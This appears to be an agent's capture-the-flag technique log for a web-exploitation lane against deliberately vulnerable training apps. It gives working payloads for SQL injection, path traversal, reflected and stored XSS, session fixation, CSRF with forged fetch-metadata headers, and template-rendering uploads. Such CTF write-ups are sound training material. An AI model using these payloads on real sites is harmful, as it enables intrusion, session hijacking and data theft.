# web — technique log (lane-days D01-D10 released; updated after every day)

How the lane has looked so far (observations, not guarantees):
- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. day 19 released D01-D03, day 20 D04-D05,
  day 21 D06-D08, day 22 D09-D10 (GM ids `web-exploitation-day-NN-<slug>`; the slug is NOT always the title: D07
  "Stored for Later" = `web-exploitation-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`). Expect 2-3
  lane-days per calendar day. Each lane-day = ONE classic bug, named by a title pun: D01 backup exposure "Back Up a
  Minute", D02 IDOR "Permission to Slip", D03 SQLi "Query Me This", D04 path traversal "Stay in Your Directory", D05
  missing function-level authz "Administratively Speaking", D06 reflected XSS "Reflect Upon This", D07 stored XSS
  "Stored for Later", D08 session fixation "Session Impression", D09 CSRF "Forged With Care", D10 unrestricted upload
  "Uploading Expectations". Arc: info-disclosure -> access control -> injection -> file read -> access control ->
  client-side (XSS x2) -> session -> CSRF -> upload (server-side turn began at D10).
- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{"id": "Target N",
  "url": "https://<48hex>.2026.huntress.ctf.games/"}]`. Reachable directly from the host, behind Cloudflare. After
  CORRECT every path returns `410 {"state":"completed"}`; an untimed target stops after 30 min idle.
- **Contract is fixed:** `proof-N` "Recover the proof from Target N.", artifact `Target N`, `exact_text`, `trim`.
  Answer = token `proof_<32 lowercase hex>` printed by the app.
- **Since D05 every app is the same kit** ("A small, complete training app with one deliberately isolated security
  boundary"; framework banner = costume: Django, Laravel/`X-Powered-By: PHP/8.3`, Node, FastAPI-style
  `/openapi.json`). `GET /api/clues` (linked as "Open workspace notes") names everything: `framework`,
  `feature_route: /<word>-<hex6>`, `secondary_route: /<word>-<hex6>`, `current_role: analyst`, plus ONE
  concept-specific key (`session_hint`, `callback_nonce`, `moderator_data_route`, `receipt_route_template`,
  `preferences_route` (D09), `render_route`+`preview_guide`+`upload_policy`+`upload_shape` (D10)). The concept key
  often states the request shape in prose (`upload_shape: "POST JSON: filename, content, content_type"`). Routes
  answer machine-readable JSON errors that say what is missing (`session_id_required`, `authenticated_login_required`,
  `browser_callback_required`, `signed_in_session_required`, `invalid_destination`, `method_not_allowed`,
  `file_not_found`). Success = `{"ok":true,"effect":"<snake_case>","evidence":"proof_..."}` or a concept-shaped JSON
  carrying `evidence` (D09 `{"destination":..,"changed_across_sites":true,"evidence":..}`) or the proof inline in a
  rendered page (D10).
- **"Browser" checks are of two kinds.** D06 and D09: NO real browser -- the server judges the request by
  fetch-metadata headers + Referer (D06 same-origin "from the reflected page"; D09 `Sec-Fetch-Site: cross-site`
  "from a stranger's page"). D07: a REAL moderator browser bot visits stored content a few seconds (sometimes >12 s)
  later and runs your script with its cookies. Try the header-judged form first; it is one request.
- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, **3 since D08**); the prompt
  describes only today's bug. Earlier bugs seen in Mastery / compounding so far: D01 (x3), D02 (x2), D04, D05. Mastery
  targets can take ~5 min in `preparing` (singles / TT 4-10 s; D09/D10 Mastery ~6 s).
- **A new class beats the generic seed every time.** D09 and D10 TT both came back `solver_incomplete` after ~41 s:
  the shipped solve.py was only the `lib.web` race (session-fixation handler + earlier days' `answer()`), which has
  no handler for the new class; the live worker solved TT by hand. The fix that held: a per-class handler keyed on the
  clue KEY, ~3-5 requests, targets in threads -> Mastery solve 3.9-4.9 s.

## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)
- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question
  `artifact` "Target N" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.
- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on
  every target (home, robots, /api/clues, /openapi.json), then run the concept probes the recon hints first, the rest
  after. Earlier solvers' `answer()` ONLY -- day-21 solvers' `fallback()`s import each other (infinite recursion =
  timeout). Running every probe at once x3 targets slowed each 2-5x: stage them.
- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |
  `inspect`; secondary `callback` | `internal` | `status` | `staff-<hex8>`; render (D10) `account` | `internal` |
  `result`; D09 `preferences_route` was the fixed `/preferences`. Rule: pick routes by clue KEY role (`feature_route`,
  `secondary_route`, `*_data_route`, `*_template`), never by the word in the value (D06 TT broke on `/internal-`).
- **Resource noun on boards** (D07): `/api/messages` + `/messages/{id}` | `/api/postcards` + `/postcards/{id}`.
  Rule: take the submit route and the `/<noun>/{id}` view from `/openapi.json` `paths` / the submit response's
  `url`, else the home page (it lists every entry with its receipt).
- **Backup exposure (D01)**: robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/`; file
  `environment-copy-<hex>.json.bak` | `site-config-<hex6>.json.bak` (+ decoy `release-notes.txt`). Rule: depth-2
  same-origin crawl from robots/sitemap/comments, regex `proof_` in bodies and zip members.
- **IDOR (D02)**: foreign ids in `/api/history`; API template from the page's `fetch()`. Rule: request foreign ids.
- **SQLi (D03)**: `/lookup?q=` wrapped in `('%..%')`. Rule: tautologies covering `'` `')` `'))` `"` + `--`/`#`.
- **LFI (D04)**: `reader.php?doc=<page>`, prompt-named `/run/huntress/objective.txt`. Rule: every param with `.`/`/`
  in its value x `../`*10+path, absolute, `....//`, `..%2f`, `php://filter`, `<orig dir>/`+`../`*10.
- **Access control (D05)**: GET (then POST) every `/...` value in the clue JSON.
- **CSRF (D09)**: route hex, the outside mailbox in the `<select name=destination>` (`review-NNNN@outside.
  example.invalid`; the current value is `daily`), and whether the hidden `csrf_token` (= `arena_session` value) is
  sent -- both worked. Rule: parse every `<form>` on the clue-named page (action, method, selects, hiddens), choose
  the non-current external option, submit as a cross-site navigation with token / without / swapped method.
- **Upload (D10)**: route words + app skin; policy text "txt + text/plain" never enforced (single, TT, Mastery).
  Rule: routes by key (`feature*` upload, `render*` preview), preview URL from the upload response's `path`, template
  syntax from the guide's `<code>` example, field name `objective`.
- **Proof carrier**: HTML text, JSON `support_note` | `note` | `evidence`, a receipt shown on a board page. Rule:
  regex `proof_[0-9a-f]{32}` over every body -- don't key on field names.

## Recognition cues -> first move
- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;
  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.
- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece (param, cookie, login, browser).
- `Disallow:` / "crawler policy" comment -> D01 crawl. "Signed in as" + `/<things>/<id>` -> D02 IDOR.
- Search form / "database" -> D03 tautology. `?doc=` + "stay inside / mounted at /path" -> D04 traversal.
- "staff-only door, just a sign", `feature_route` -> D05 GET it.
- "repeats everything you tell it", "talks back", `callback_nonce` -> D06: reflect `<script>fetch('<cb>?nonce=N')
  </script>` via `?q=` on the feature route, then GET the callback yourself with browser headers.
- "guestbook", "reviewer stops by", "good things come to those who wait", `moderator_data_route` -> D07: store a
  script that fetches the data route and POSTs it to the receipt route; poll the entry page.
- "plant your session", "welcome mat", "somebody else's credentials", `session_hint` -> D08 session fixation.
- "obeys whoever asks nicely -- even strangers", "forge one request", `preferences_route`, a form with hidden
  `csrf_token` -> D09 CSRF: submit the form's state change with `Sec-Fetch-Site: cross-site`, `Sec-Fetch-Mode:
  navigate`, `Sec-Fetch-Dest: document`, foreign `Referer`; read `/api/preferences`.
- "upload form has standards. Low ones", "served from somewhere it was never meant to live", `upload_shape`,
  `render_route`, `preview_guide` -> D10: upload `.html` with `{{objective}}`, open the preview path.
- JSON with `evidence` = landed; `evidence` is the answer.

## Day by day
- **D01-D05 (cal. 19-20)**, compressed: D01 robots Disallow -> index -> `.json.bak` `support_note` (Mastery D04 missed
  it: crawl only one level deep). D02 `/api/history` foreign id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1
  --` (plain `' OR '1'='1` failed: paren-wrapped). D04 `reader.php?doc=../`*6+`run/huntress/objective.txt` (absolute
  and `....//` failed); single 51 s. D05 `/api/clues` -> GET `/dispatch-<hex6>` -> `effect:
  framework_authorization_bypassed`; single 47 s, Mastery 340 s (321 s preparing).
- **D06 Reflect Upon This (cal. 21)** -- reflected XSS, server-judged. GET `<feature>?q=<script>fetch('<cb>?nonce=N')
  </script>`, then GET `<secondary>?nonce=N` with `Sec-Fetch-Site: same-origin`, `-Mode: cors`, `-Dest: empty`,
  `Referer: <reflected URL>`, `Origin`, `X-Callback-Nonce: N` -> `effect: isolated_browser_callback`. 83 s. TT broke
  on choosing the callback by the word `callback` (TT's was `/internal-<hex6>`) -> pick by key `secondary_route`.
- **D07 Stored for Later (cal. 21)** -- stored XSS, real moderator bot. POST `{"message":"<script>..fetch(DATA,
  {credentials:'include'}) .. POST {evidence:t} to RCPT(id from location.pathname)</script>","name":"guest"}` to
  `/api/messages`; poll `/messages/{id}`. 78 s. Mastery: `/api/postcards` variant (derive view from openapi/submit
  `url`), receipt landed after 12 s, solver mutual recursion, submit 503 that had landed (`already_solved` on retry).
- **D08 Session Impression (cal. 21)** -- session fixation. `GET /action-<hex6>?sid=<session_hint>` (`?session=`,
  `?session_id=`, JSON, `X-Session-Id`, cookies all failed) -> `Set-Cookie: arena_session=<hint>`; `GET
  /status-<hex6>` with that cookie -> `effect: fixed_session_privilege_transfer`. 116 s. Mastery (3 targets) ~15 min:
  racing every solver on every target starved the app -> recon-gate the probes.
- **D09 Forged With Care (cal. 22)** -- CSRF judged server-side by fetch-metadata (no bot). Clues: `feature_route:
  /submit-<hex6>`, `preferences_route: /preferences`. `GET /` sets `arena_session`; `/preferences` holds `<form
  method='get' action='/submit-<hex6>'>` with `<select name=destination>` (`daily` | `review-NNNN@outside.example.
  invalid`) + hidden `csrf_token` (= session value). Bare/same-site submit -> `changed_across_sites:false`;
  missing cookie -> `signed_in_session_required`; bad option -> `invalid_destination`. Worked: `curl --max-time 20 -b
  arena_session=S -H 'Sec-Fetch-Site: cross-site' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Dest: document' -H
  'Referer: https://evil.example/' '<base>/submit-<hex6>?destination=review-NNNN%40outside.example.invalid'`, then
  `GET /api/preferences` -> `{"destination":..,"changed_across_sites":true,"evidence":"proof_.."}`. Token optional.
  Single CORRECT 70 s. TT `solver_incomplete` (41 s generic race, no CSRF handler; live worker hand-solved);
  generalized `csrf()` form parser ~5 requests ~1 s. Mastery 3 targets CORRECT, solve 4.9 s.
- **D10 Uploading Expectations (cal. 22)** -- unrestricted upload rendered by a server-side template preview. Clues:
  `feature_route` (`/execute|action|inspect-<hex6>`), `render_route` (`/account|internal|result-<hex6>`),
  `preview_guide` (staff HTML previews evaluate `{{field}}`; objective field `objective`), `upload_policy` ("txt,
  text/plain" -- not enforced), `upload_shape: "POST JSON: filename, content, content_type"`. Worked: POST
  `{"filename":"note.html","content":"<p>{{objective}}</p>","content_type":"text/html"}` -> `{"path":"<render>?file=
  note.html"}` -> GET it -> proof in HTML. GET on the upload route -> `method_not_allowed`; wrong file ->
  `file_not_found`. No code execution, no traversal needed. Single CORRECT 58 s. TT `solver_incomplete` (40.65 s
  generic race, targets serial); generalized handler 3 requests. Mastery (D01 backup + D02 IDOR + D10) CORRECT,
  solve 3.9 s with targets threaded.

## GM answer conventions learned
- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.
  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`.
- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),
  `fixed_session_privilege_transfer` (D08). D09 has no `effect`: `changed_across_sites:true` + `evidence`. D10
  prints the proof in the rendered preview HTML. D07 shows the proof in a moderator receipt on the entry page instead.
- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.

## Pitfalls that cost time
- Choosing routes by the WORD in a clue value (`callback`, `messages`) -- words are re-dealt; use clue keys / openapi.
- Routing by prompt keywords in Mastery: earlier-day targets get today's prompt (D04 missed T1).
- One-level crawls: the D01 proof sits one link below the Disallow index.
- Solvers importing each other's `fallback()` -> mutual recursion -> timeout. Import `answer()` only.
- Hammering one target with every earlier probe in parallel slows the app; recon-gate the probes.
- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.
- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.
- Shipping a new day with only the generic `lib.web` race: a new class always misses it and burns ~40 s (D09, D10
  TT). Write the class handler (keyed on the new clue key) into solve.py before TT; run Mastery targets in threads.
- Trusting the app's stated policy ("txt only", "token required"): D09 token and D10 type rules were decorative --
  try the forbidden form first, it is one request.
- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.

## reviewer cross-check (measured on a parallel agent; folded into the drivers)
- **Blind SQLi oracle trap.** The search interpolates `q` into an EVEN number of `col LIKE '%q%'` clauses, so the
  classic tautology PAIR is NOT an oracle: `' OR '1'='1` and `' OR '1'='2` BOTH return all rows (the first clause
  degenerates to `LIKE '%'`). "Same result both ways" is not "not injectable." What works is QUOTE BALANCE:
  `nope' OR (<cond>) OR '1'='2` makes every literal clause false and reduces the WHERE to `<cond>` (rows = TRUE,
  0 rows = FALSE); calibrate on `1=1`/`1=2`. Backend is SQLite (`information_schema` absent); the proof is the
  `summary` of the hidden row — `... WHERE summary LIKE char(112,114,111,111,102,37)` spells `'proof%'` without a
  quote. Odd-quote / `--` / `#` / `;` / `%'`-breakout payloads all dead-end. (`lib/web/handlers` ladder now carries a
  quote-balanced payload.)
- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2 traversal; escalate to >= 3 `../` into the
  absolute path the prompt names (measured `/run/huntress/objective.txt`). The viewer script/param name re-rolls —
  read it off the root page's links. (`doc` + a deep huntress-objective payload added to the ladder.)
- **`control_unavailable` is TRANSIENT, not terminal.** An `op=start` can answer `control_unavailable` after a hang
  (measured 26.7 s on 2026-10-22); a plain `op=start` resend succeeded on try 1. Treat it as unjudged — back off and
  re-send — never as a gate or a dead route. (`webtarget.terminal()` now classes it with `rate_limited`.)
